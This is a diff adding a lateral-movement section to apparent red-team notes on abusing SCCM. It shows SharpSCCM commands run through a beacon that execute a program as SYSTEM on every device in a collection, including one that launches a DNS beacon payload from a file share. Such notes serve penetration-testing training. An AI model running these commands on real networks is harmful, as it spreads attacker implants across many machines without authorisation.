@@ -72,4 +72,13 @@ These credentials should only have read access to the SDP, but are often times o
    
 Or request a copy of the policy directly from SCCM using ```get naa``` (requires LA to obtain a copy of its SMS Signing and SMS Encryption certs).
 
-## 
+## Lateral Movement
+
+With Full or Application Administrator privileges, we can deploy scripts or applications to aid in lateral movement. To execute a command on every device in the DEV collection, do exec -n DEV -p <path>:
+
+    beacon> execute-assembly SharpSCCM.exe exec -n DEV -p C:\Windows\notepad.exe --no-banner
+
+SharpSCCM attempts to hide the command from the GUI, but the deployment is still visible until it completes. By default, the above will execute Notepad as the user currently logged into each machine. If a user is not logged in, then the command won't execute. We can force it to execute as SYSTEM using the -s parameter, and this will execute on every machine regardless of whether a user is currently logged in or not. As with GPO Abuse, we can upload and execute a DNS Beacon payload:
+
+    beacon> execute-assembly SharpSCCM.exe exec -n DEV -p "C:\Windows\System32\cmd.exe /c start /b \\dc-2\software\dns_x64.exe" -s --no-banner
+
